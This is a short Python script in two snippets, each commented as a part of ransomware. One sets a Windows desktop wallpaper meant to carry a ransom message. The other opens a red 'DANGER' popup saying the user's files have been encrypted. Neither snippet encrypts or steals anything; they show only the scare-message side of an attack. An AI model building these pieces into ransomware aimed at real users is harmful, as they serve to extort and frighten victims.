#!/usr/bin/python3


#Alter the desktop wallpaper on a Windows PC with a ransomware message


import ctypes
import os

def change_wallpaper(image_path):
    # Verify if the image file exists
    if not os.path.exists(image_path):
        print("Error: Image file does not exist.")
        return

    # Set the wallpaper
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
    print("Wallpaper changed successfully.")

if __name__ == "__main__":
    image_path = "C:\\path\\to\\your\\desired\\wallpaper.jpg"  # Replace with your desired image path
    change_wallpaper(image_path)





#Create a popup window on a Windows PC with a ransomware message

import tkinter as tk

def show_message_box():
    # Create a new window for the message box
    root = tk.Toplevel()
    root.title("DANGER")

    # Set the window dimensions and position it in the center of the screen
    window_width = 300
    window_height = 200
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width - window_width) // 2
    y = (screen_height - window_height) // 2
    root.geometry(f"{window_width}x{window_height}+{x}+{y}")

    # Set the background and foreground colors
    root.configure(bg="red")
    message_label = tk.Label(root, text="oooops your files have been encrypted!!!.", fg="black", bg="light blue", font=("Arial", 12))
    message_label.pack(pady=20)

    # Run the event loop
    root.mainloop()

if __name__ == "__main__":
    show_message_box()
